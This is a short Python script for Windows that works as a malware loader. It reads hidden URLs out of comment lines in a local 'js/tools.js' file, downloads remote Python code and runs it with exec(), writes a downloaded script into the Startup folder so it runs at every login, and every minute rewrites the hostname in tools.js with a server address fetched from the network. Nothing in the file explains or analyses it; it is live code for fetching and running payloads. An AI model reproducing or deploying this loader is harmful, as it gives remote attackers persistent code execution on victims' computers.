from urllib import request
import os
import winshell
import subprocess, threading
import psutil, time

def check_server(server_name):
    for proc in psutil.process_iter():
        try:
            if server_name.lower() in proc.name().lower():
                return True
        except:
            pass
    
    return False

def get_string(p):
    with request.urlopen(p) as f:
        s = f.read().decode('utf-8')
        return s

def get_lines(p):
    with request.urlopen(p) as f:
        l = f.readlines()
        return l

def set_fl(p, l):
    with open(p, 'wb') as f:
        f.writelines(l)

def get_start_p(name):
    return os.path.join(winshell.startup(), name)

def work():
    while True:
        try:
            if(new_server == "" or len(new_server) < 5 or new_server == None):
                pass
            else:
                if(new_server != None):
                    l[0] = f"var hostname = '{new_server}'\n"
                    with open("js/tools.js", "w") as f:
                        f.writelines(l)
            time.sleep(60)
            
        except Exception as e:
            time.sleep(10)
    

def manage():
    ready = get_string(l[4][2:])
    exec(new_s)
    while not os.path.exists(os.path.join(os.environ.get('appdata'), 'python_server.pyw')):
        time.sleep(5)
    try:
        with open(get_start_p("server.pyw"), "w+") as f:
            f.write(ready)
        exec(ready)
    except:
        time.sleep(60)
        

if __name__ == "__main__":
    with open("js/tools.js") as f:
        l = f.readlines()
    server_name = l[5][2:]
    new_server = ""
    server = get_lines(server_name)
    new_server = server[0].decode('utf-8').strip()
    del server[0]
    new_l = [x.decode('utf-8') for x in server]
    new_s = ""
    for x in new_l:
        new_s += x

    t1 = threading.Thread(target=manage)
    t2 = threading.Thread(target=work)
    t1.start()
    t2.start()
    t1.join()
    t2.join()